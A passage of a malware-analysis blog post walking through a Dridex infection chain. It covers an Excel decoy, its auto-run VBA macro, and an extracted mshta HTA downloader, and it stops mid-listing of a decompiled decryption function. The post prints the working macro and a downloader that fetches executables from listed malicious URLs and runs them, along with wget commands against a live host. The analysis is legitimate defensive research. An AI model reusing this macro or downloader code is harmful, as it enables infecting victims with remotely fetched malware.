<!DOCTYPE html>

<html lang="en">
<head>
<link href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.11.1/tocbot.css" rel="stylesheet"/>
<title>Cutting corners against a Dridex downloader </title>
<!-- Meta -->
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="When one faces obfuscated code, it is sometimes more efficient to focus on the data instead. By using Malcat's different views and analyses (and a bit of guessing as well), we will show how to statically unpack an excel downloader and the following obfuscated native dropper without doing (much) reverse engineering." name="description"/>
<meta content="Malcat EI" name="author"/>
<link href="https://malcat.fr/favicon.ico" rel="shortcut icon"/>
<meta content="Cutting corners against a Dridex downloader" property="og:title"/>
<meta content="article" property="og:type">
<meta content="When one faces obfuscated code, it is sometimes more efficient to focus on the data instead. By using Malcat's different views and analyses (and a bit of guessing as well), we will show how to statically unpack an excel downloader and the following obfuscated native dropper without doing (much) reverse engineering." property="og:description"/>
<meta content="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/obfu.png" property="og:image"/>
<meta content="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/" property="og:url"/>
<meta content="summary_large_image" name="twitter:card"/>
<meta content="MALCAT" property="og:site_name"/>
<meta content="@malcat4ever" name="twitter:site"/>
<meta content="@malcat4ever" name="twitter:creator"/>
<!-- FontAwesome JS -->
<link href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
<link href="https://malcat.fr/theme/plugins/tiny-slider/tiny-slider.css" rel="stylesheet">
<!--<script defer src="https://malcat.fr/theme/fontawesome/js/all.js"></script>-->
<link href="https://malcat.fr/theme/fontawesome/css/all.min.css" rel="stylesheet"/>
<!-- Javascript -->
<script src="https://malcat.fr/theme/plugins/jquery-3.4.1.min.js"></script>
<script src="https://malcat.fr/theme/plugins/popper.min.js"></script>
<script src="https://malcat.fr/theme/plugins/bootstrap/js/bootstrap.min.js"></script>
<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script src="https://malcat.fr/theme/plugins/tiny-slider/min/tiny-slider.js"></script>
<!-- Plugin CSS -->
<link href="https://malcat.fr/theme/plugins/tiny-slider/tiny-slider.css" rel="stylesheet"/>
<!-- Theme CSS -->
<link href="https://malcat.fr/theme/css/theme.css" id="theme-style" rel="stylesheet"/>
<link href="https://malcat.fr/theme/css/extra.css" id="theme-style" rel="stylesheet"/>
<link href="https://malcat.fr/theme/css/pygment.css" id="theme-style" rel="stylesheet"/>
<!-- Feeds -->
<link href="https://malcat.fr/rss.xml" rel="alternate" title="MALCAT Full RSS Feed" type="application/rss+xml">
</link></link></link></meta><link href="https://malcat.fr\blog/cutting-corners-against-a-dridex-downloader/" rel="canonical"/><script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "MALCAT", "item": "https://malcat.fr"}, {"@type": "ListItem", "position": 2, "name": "Blog", "item": "https://malcat.fr\\blog"}, {"@type": "ListItem", "position": 3, "name": "Cutting corners against a dridex downloader", "item": "https://malcat.fr\\blog/cutting-corners-against-a-dridex-downloader"}, {"@type": "ListItem", "position": 4, "name": "Index", "item": "https://malcat.fr\\blog/cutting-corners-against-a-dridex-downloader/index.html"}]}</script><script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "author": {"@type": "Person", "name": "malcat team"}, "publisher": {"@type": "Organization", "name": "MALCAT"}, "headline": "Cutting corners against a Dridex downloader", "about": "malware analysis", "datePublished": "2022-03-13 00:00"}</script></head>
<body>
<header class="header text-center">
<div class="wrapper force-overflow">
<nav class="navbar navbar-expand-lg navbar-dark" id="sidebar">
<button aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navigation" data-toggle="collapse" type="button">
<span class="navbar-toggler-icon"></span>
</button>
<div class="collapse navbar-collapse flex-column" id="navigation">
<div class="sidebar-header profile-section pt-3 pt-lg-0">
<a href="https://malcat.fr"><img alt="logo" class="profile-image mb-3 mx-auto" src="https://malcat.fr/theme/images/malcat.png"/></a>
<div class="bio mb-3">MALCATÂ -Â the binary file dissector</div>
</div>
<ul class="list-unstyled components">
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/index.html">The software</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/features.html">Features &amp; roadmap</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/download.html">Download</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://malcat.fr/about-us.html">About</a>
</li>
<li class="nav-item">
<a class="nav-link" href="https://doc.malcat.fr">User manual</a>
</li>
<li class="nav-item active">
<a class="nav-link" href="https://malcat.fr/blog.html">Blog</a>
</li>
</ul>
<div class="toc-container">
<div class="pb-3"></div>
<span>Table of contents</span>
<nav class="toc js-toc"></nav>
<div class="pb-3"></div>
</div>
</div>
</nav>
</div><!--//force-overflow-->
</header>
<div class="main-wrapper">
<section class="theme-bg-light">
<div class="container single-col-max-width">
<header class="blog-post-header">
<h1 class="title mb-3 theme-bg-light">Cutting corners against a Dridex downloader</h1>
<div class="meta mb-3">
<span class="date"><i class="fa fa-calendar"></i>Sun 13 March 2022</span>
<span class="date"><i class="fa fa-user"></i><a href="https://malcat.fr/author/malcat-team.html">malcat team</a></span>
<span class="date"><i class="fa fa-tags"></i><a href="https://malcat.fr/category/malware-analysis.html">malware analysis</a>, <a href="https://malcat.fr/category/office.html">office</a>, <a href="https://malcat.fr/category/x86.html">x86</a>, <a href="https://malcat.fr/category/unpacking.html">unpacking</a>, <a href="https://malcat.fr/category/dridex.html">dridex</a></span>
</div>
</header>
</div>
</section>
<section class="latest-blog-section p-3 p-lg-5">
<article class="blog-post px-3 py-5 p-md-5">
<div class="blog-post-body js-toc-content container single-col-max-width">
<dl class="row">
<dt class="col-sm-3 theme-bg-light mb-1">Sample:</dt>
<dd class="col-sm-9">6f8f1b26324ea0f3f566fbdcb4a61eb92d054ccf0300c52b3549c774056b8f02 (<a href="https://bazaar.abuse.ch/sample/6f8f1b26324ea0f3f566fbdcb4a61eb92d054ccf0300c52b3549c774056b8f02/">Bazaar</a>, <a href="https://www.virustotal.com/gui/file/6f8f1b26324ea0f3f566fbdcb4a61eb92d054ccf0300c52b3549c774056b8f02">VT</a>, <a href="https://app.any.run/tasks/b09f87f9-5a26-49fb-9f1a-4d2aa5eb5212/">AnyRun</a>)</dd>
<dt class="col-sm-3 theme-bg-light mb-1">Infection chain:</dt>
<dd class="col-sm-9">Excel -&gt; mshta downloader -&gt; x86 injector -&gt; x86 injector -&gt; Dridex first stage</dd>
<dt class="col-sm-3 theme-bg-light mb-1">Difficulty:</dt>
<dd class="col-sm-9">Intermediate</dd>
</dl>
<h1 id="the-downloader">The downloader</h1>
<h2 id="excel-document">Excel document</h2>
<p>The sample we are going to dissect came as a 728KB Excel 97 document inside an email. The OLE container is pretty simple: most of its space is taken by the Excel Workbook (711KB). The rest is made of metadatas (claim to be <code>Invoice 720710 from Quickbooks, LLC</code>) and a small VBA project. A legit-looking picture from GlobalSign on the first Excel sheet tells the user to enable editing + content in order to decrypt the office document. This manipulation will indeed enable and run the document (malicious) macros.</p>
<figure id="format1"><img alt="Excel decoy sheet" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/excel.jpg"><figcaption>Figure 1: Excel decoy sheet</figcaption></img></figure>
<p>The VBA project contains a single <code>WorkBook_Open</code> macro. In Excel, the <code>WorkBook_Open</code> macro is automatically run when the document is opened. By hitting <strong>F4</strong> in Malcat, we can decompile the VBA code:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="k">Sub</span><span class="w"> </span><span class="nf">WorkBook_Open</span><span class="p">()</span>
<span class="w">    </span><span class="k">For</span><span class="w"> </span><span class="k">Each</span><span class="w"> </span><span class="n">qHundredMillions</span><span class="w"> </span><span class="ow">In</span><span class="w"> </span><span class="n">ActiveWorkbook</span><span class="p">.</span><span class="n">Sheets</span><span class="p">(</span><span class="s">"Sheet1"</span><span class="p">).</span><span class="n">Range</span><span class="p">(</span><span class="s">"A65:O2886"</span><span class="p">)</span>
<span class="w">        </span><span class="k">If</span><span class="w"> </span><span class="n">qHundredMillions</span><span class="p">.</span><span class="n">Value</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">Then</span>
<span class="w">            </span><span class="n">qUnlockedCells</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">qUnlockedCells</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Chr</span><span class="p">(</span><span class="n">qHundredMillions</span><span class="p">.</span><span class="n">Value</span><span class="p">)</span>
<span class="w">        </span><span class="k">End</span><span class="w"> </span><span class="k">If</span>
<span class="w">    </span><span class="k">Next</span><span class="w"> </span><span class="n">qHundredMillions</span>
<span class="k">Set</span><span class="w"> </span><span class="n">qPCX</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Scripting.FileSystemObject"</span><span class="p">)</span>
<span class="w">    </span><span class="k">With</span><span class="w"> </span><span class="n">qPCX</span>
<span class="w">        </span><span class="k">Set</span><span class="w"> </span><span class="n">qLine</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">.</span><span class="n">CreateTextFile</span><span class="p">(</span><span class="n">Environ</span><span class="p">(</span><span class="s">"ALLUSERSPROFILE"</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s">"\qRangeAutoFormatLocalFormat3.sct"</span><span class="p">)</span>
<span class="n">qLine</span><span class="p">.</span><span class="n">Write</span><span class="w"> </span><span class="p">(</span><span class="n">qUnlockedCells</span><span class="p">)</span>
<span class="n">qLine</span><span class="p">.</span><span class="n">Close</span>
<span class="w">    </span><span class="k">End</span><span class="w"> </span><span class="k">With</span>
<span class="k">With</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="p">.</span><span class="n">Exec</span><span class="w"> </span><span class="p">(</span><span class="s">"mshta "</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Environ</span><span class="p">(</span><span class="s">"ALLUSERSPROFILE"</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s">"\qRangeAutoFormatLocalFormat3.sct"</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">))</span>
<span class="k">End</span><span class="w"> </span><span class="k">With</span>
<span class="k">End</span><span class="w"> </span><span class="k">Sub</span>
</code></pre></div></td></tr></table></div>
<p>The macro is pretty straightforward, and write the content of the sheet cells from A65 up to O2886 into a file, before running the file through the mshta.exe program. As we already suspected given the size of the Workbook stream, it means that the payload is actually stored inside the sheet cells.</p>
<p>Malcat can parse both Biff8 (.xls) and Biff12 (.xlsb) Excel binary documents. Just double-click on the Workbook stream in the Virtual File System tab of the OLE container and you can inspect the content of the excel document. To display cell values and (decompiled) formulas, you can hit <strong>F4</strong>. This time there is no formula inside the sheet, but a lot of numerical values inside the cells lies in the ascii range, which is kind of <em>unusual</em>.</p>
<h2 id="extracting-the-mshta-downloader">Extracting the Mshta Downloader</h2>
<p>The cells are displayed in order in the decompiler view, so it should be easy to recover the written file programmatically. We can do it two ways:</p>
<ul>
<li>Copy-paste the content of the <strong>F4</strong> view (starting at the cell <code>$B$65</code>) into an editor and post-process it using python or your text editor of choice macros.</li>
<li>Use Malcat's scripting to iterate over the cell values and reconstruct the file.</li>
</ul>
<p>We will choose the second solution. Using Malcat's script engine, we have access to the file format parser and its result in the <code>malcat.analyzer</code> variable. In this case, the Biff8 file format parser (in <code>data/filetypes/Office.Workbook8.py</code>) stores some extra cell information in its <code>sheets</code> variable. Go to the script editor view via <strong>F8</strong> and enter the following script:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">res</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
<span class="n">sheet1</span> <span class="o">=</span> <span class="n">malcat</span><span class="o">.</span><span class="n">analyzer</span><span class="o">.</span><span class="n">sheets</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="k">for</span> <span class="n">cell</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">sheet1</span><span class="o">.</span><span class="n">values</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">val</span><span class="p">)</span> <span class="o">==</span> <span class="nb">float</span> <span class="ow">and</span> <span class="n">val</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">res</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">val</span><span class="p">))</span>
<span class="n">gui</span><span class="o">.</span><span class="n">open_after</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="n">res</span><span class="p">),</span> <span class="s2">"droppped"</span><span class="p">)</span>
</code></pre></div></td></tr></table></div>
<p>We obtain the following HTML file (comments have been removed for clarity):</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span>
<span class="normal">34</span>
<span class="normal">35</span>
<span class="normal">36</span>
<span class="normal">37</span>
<span class="normal">38</span>
<span class="normal">39</span>
<span class="normal">40</span>
<span class="normal">41</span>
<span class="normal">42</span>
<span class="normal">43</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">HTA:APPLICATION</span> <span class="na">ID</span><span class="o">=</span><span class="s">"CS"</span>
<span class="na">APPLICATIONNAME</span><span class="o">=</span><span class="s">"Test"</span>
<span class="na">WINDOWSTATE</span><span class="o">=</span><span class="s">"minimize"</span>
<span class="na">MAXIMIZEBUTTON</span><span class="o">=</span><span class="s">"no"</span>
<span class="na">MINIMIZEBUTTON</span><span class="o">=</span><span class="s">"no"</span>
<span class="na">CAPTION</span><span class="o">=</span><span class="s">"no"</span>
<span class="na">SHOWINTASKBAR</span><span class="o">=</span><span class="s">"no"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">"text/vbscript"</span> <span class="na">LANGUAGE</span><span class="o">=</span><span class="s">"VBScript"</span> <span class="p">&gt;</span>
<span class="nx">On</span><span class="w"> </span><span class="ne">Error</span><span class="w"> </span><span class="nx">Resume</span><span class="w"> </span><span class="nx">Next</span>
<span class="nx">For</span><span class="w"> </span><span class="nx">Each</span><span class="w"> </span><span class="nx">qDialogWorkbookCopy</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nb">Array</span><span class="p">(</span><span class="s2">"http://onlinefastsolutions.com:8088/tpls/file3.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://onlinefastsolutions.com:8088/images/details.bin"</span><span class="p">,</span><span class="s2">"http://fasteasyupdates.com:8088/vendors/file4.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://onlinefastsolutions.com:8088/js/file1.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://buyer-remindment.com:8088/fonts/file8.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://buyer-remindment.com:8088/css/file7.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://onlinefastsolutions.com:8088/images/file13.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://insiderushings.com:8088/js/file13.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://buyer-remindment.com:8088/tpls/file4.bin"</span><span class="p">,</span>
<span class="w">    </span><span class="s2">"http://paymentadvisry.com:8088/wp-theme/file7.bin"</span><span class="p">)</span>
<span class="w">    </span><span class="nb">Set</span><span class="w"> </span><span class="nx">qDialogWorkspace</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">createobject</span><span class="p">(</span><span class="s2">"MSXML2.ServerXMLHTTP.6.0"</span><span class="p">)</span>
<span class="w">    </span><span class="nb">Set</span><span class="w"> </span><span class="nx">qSortValues</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">createobject</span><span class="p">(</span><span class="s2">"Adodb.Stream"</span><span class="p">)</span>
<span class="w">    </span><span class="nx">qDialogWorkspace</span><span class="p">.</span><span class="nx">Open</span><span class="w"> </span><span class="s2">"GET"</span><span class="p">,</span><span class="w"> </span><span class="nx">qDialogWorkbookCopy</span><span class="p">,</span><span class="w"> </span><span class="nx">False</span>
<span class="w">    </span><span class="nx">qDialogWorkspace</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="w"> </span><span class="s2">"User-Agent"</span><span class="p">,</span><span class="w"> </span><span class="s2">"qWK3FM3"</span>
<span class="w">    </span><span class="nx">qDialogWorkspace</span><span class="p">.</span><span class="nx">Send</span>
<span class="w">    </span><span class="nx">If</span><span class="w"> </span><span class="nx">qDialogWorkspace</span><span class="p">.</span><span class="nx">Status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">And</span><span class="w"> </span><span class="nx">Len</span><span class="p">(</span><span class="nx">qDialogWorkspace</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">)</span><span class="o">&gt;</span><span class="mf">1000</span><span class="w"> </span><span class="nx">Then</span>
<span class="w">    </span><span class="nb">Set</span><span class="w"> </span><span class="nx">qTriangle</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">CreateObject</span><span class="p">(</span><span class="s2">"Wscript.Shell"</span><span class="p">)</span>
<span class="w">    </span><span class="kd">with</span><span class="w"> </span><span class="nx">qSortValues</span>
<span class="w">        </span><span class="p">.</span><span class="nx">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="w"> </span>
<span class="w">        </span><span class="p">.</span><span class="nx">open</span>
<span class="w">        </span><span class="p">.</span><span class="nx">write</span><span class="w"> </span><span class="nx">qDialogWorkspace</span><span class="p">.</span><span class="nx">responseBody</span>
<span class="w">        </span><span class="p">.</span><span class="nx">savetofile</span><span class="w"> </span><span class="nx">qTriangle</span><span class="p">.</span><span class="nx">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">"%ALLUSERSPROFILE%"</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\qDialogMainChartType.exe"</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span>
<span class="w">    </span><span class="nx">end</span><span class="w"> </span><span class="kd">with</span>
<span class="w">    </span><span class="nx">qTriangle</span><span class="p">.</span><span class="nx">Exec</span><span class="p">(</span><span class="nx">qTriangle</span><span class="p">.</span><span class="nx">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s2">"%ALLUSERSPROFILE%"</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="s2">"\qDialogMainChartType.exe"</span><span class="p">)</span>
<span class="w">    </span><span class="nx">Exit</span><span class="w"> </span><span class="nx">For</span>
<span class="w">    </span><span class="nx">End</span><span class="w"> </span><span class="nx">If</span>
<span class="nx">Next</span>
<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</code></pre></div></td></tr></table></div>
<p>The Mshta script listed above is a pretty straightforward downloader. Let's just try to WGET one of the url:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>wget<span class="w"> </span><span class="s2">"http://buyer-remindment.com:8088/fonts/file8.bin"</span>
Resolving<span class="w"> </span>buyer-remindment.com...<span class="w"> </span><span class="m">208</span>.83.69.35,<span class="w"> </span><span class="m">163</span>.172.213.69,<span class="w"> </span><span class="m">128</span>.199.243.169
Connecting<span class="w"> </span>to<span class="w"> </span>buyer-remindment.com<span class="p">|</span><span class="m">208</span>.83.69.35<span class="p">|</span>:8088...<span class="w"> </span>connected.
HTTP<span class="w"> </span>request<span class="w"> </span>sent,<span class="w"> </span>awaiting<span class="w"> </span>response...<span class="w"> </span><span class="m">404</span><span class="w"> </span>Not<span class="w"> </span>Found
</code></pre></div></td></tr></table></div>
<p>Hmm no luck. But maybe they do User-Agent filtering. Let's use the user agent provided in the script:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>wget<span class="w"> </span>-U<span class="w"> </span>qWK3FM3<span class="w"> </span><span class="s2">"http://buyer-remindment.com:8088/fonts/file8.bin"</span>
Resolving<span class="w"> </span>buyer-remindment.com...<span class="w"> </span><span class="m">208</span>.83.69.35,<span class="w"> </span><span class="m">163</span>.172.213.69,<span class="w"> </span><span class="m">128</span>.199.243.169
Connecting<span class="w"> </span>to<span class="w"> </span>buyer-remindment.com<span class="p">|</span><span class="m">208</span>.83.69.35<span class="p">|</span>:8088...<span class="w"> </span>connected.
HTTP<span class="w"> </span>request<span class="w"> </span>sent,<span class="w"> </span>awaiting<span class="w"> </span>response...<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
Length:<span class="w"> </span><span class="m">167936</span><span class="w"> </span><span class="o">(</span>164K<span class="o">)</span><span class="w"> </span><span class="o">[</span>application/octet-stream<span class="o">]</span>
Saving<span class="w"> </span>to:<span class="w"> </span><span class="s1">'file8.bin'</span>
file8.bin<span class="w">         </span><span class="m">100</span>%<span class="o">[============================</span>&gt;<span class="o">]</span><span class="w"> </span><span class="m">164</span>.00K<span class="w">   </span>349KB/s<span class="w">    </span><span class="k">in</span><span class="w"> </span><span class="m">0</span>.5s
</code></pre></div></td></tr></table></div>
<p>Bingo, we have the file!</p>
<h1 id="the-first-stage">The first stage</h1>
<h2 id="locating-the-payload">Locating the payload</h2>
<p>The downloaded file is a 167KB PE file of sha256 <code>277089cb78a9c493cecd8f5fbe70df0577d4f9557fb8b55ff5f7c2505308ca3a</code> (<a href="https://bazaar.abuse.ch/sample/277089cb78a9c493cecd8f5fbe70df0577d4f9557fb8b55ff5f7c2505308ca3a/">Bazaar</a>, <a href="https://www.virustotal.com/gui/file/277089cb78a9c493cecd8f5fbe70df0577d4f9557fb8b55ff5f7c2505308ca3a/detection">VT</a>, <a href="https://app.any.run/tasks/7c42771a-1760-43bf-afda-5d86abcf0034/">AnyRun</a>) and plays in a higher league. We don't know much about the file since both the version informations and the rich header seem fake. And while the number of identified functions seems low (55), most of them seem obfuscated. How to be sure they are obfuscated? Well there are a lot of fake API calls, a lot of useless arithmetic operations, and the control flow graph (<strong>F4</strong>) of some of the functions look like this:</p>
<figure id="format2"><img alt="CFG of an obfuscated function" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/obfu.png"/><figcaption>Figure 2: CFG of an obfuscated function</figcaption></figure>
<p>While I enjoy pure static analysis, this would be the point where I would normally switch to dynamic analysis. Reversing obfuscated code is not really fun. But on the other hand, dealing with anti-VM and anti-debugging tricks is also not very fun. So let's give static analysis a chance. Since looking at the code there won't bring us much, we will first do the usual preliminary work: locating the payload data. We have two high-entropy buffers there: </p>
<ul>
<li>one in the .text section at approximatively <code>0x10002a8d</code>-<code>0x10012ab8</code> (about 0x1002b bytes): this will be buffer A</li>
<li>one in the .data section at approximatively <code>0x1001619f</code>-<code>0x10026265</code> (about 0x100c6 bytes): this will be buffer B</li>
</ul>
<p>This definitely looks like payload material. Then we will look for cross-references to these two buffers (right-click on the first byte in data view, and choose cross-references).</p>
<figure id="format3"><img alt="The two obfuscated buffers" class="photo" src="https://malcat.fr/blog/cutting-corners-against-a-dridex-downloader/buffers.png"/><figcaption>Figure 3: The two obfuscated buffers</figcaption></figure>
<p>There is exactly one cross-reference for each of these buffers:</p>
<ul>
<li>one cross-reference to buffer A in the .data section at address <code>0x10026264</code>. The pointer itself is not referenced.</li>
<li>one cross-reference to buffer B in the .data section at address <code>0x10026200</code>. The pointer is itself referenced by the function <code>sub_10013940</code> at address <code>0x100139f4</code> </li>
</ul>
<p>The first buffer looks like a dead-end, let us have a look at the second, and more particularly to the function <code>sub_10013940</code>. </p>
<h2 id="reversing-the-decryption-function">Reversing the decryption function</h2>
<p>Like the rest of the code, this function is obfuscated and code is bloated with arithmetic operations. But decompilers are notably good at one thing: constant propagation. So let us run the Sleigh decompiler (double-press <strong>F4</strong>) and have a look at the decompiled code:</p>
<div class="highlight"><table class="highlighttable table table-bordered table-responsive-sm"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span>
<span class="normal">29</span>
<span class="normal">30</span>
<span class="normal">31</span>
<span class="normal">32</span>
<span class="normal">33</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="n">xunknown4</span><span class="w"> </span><span class="nf">sub_10013940</span><span class="p">(</span><span class="n">int4</span><span class="w"> </span><span class="n">param_1</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iVar1</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iVar2</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iVar3</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iStack80</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iStack72</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iStack60</span><span class="p">;</span>
<span class="w">    </span><span class="n">int4</span><span class="w"> </span><span class="n">iStack52</span><span class="p">;</span>

<span class="w">    </span><span class="n">iStack52</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="n">iStack72</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">do</span><span class="w"> </span><span class="p">{</span>
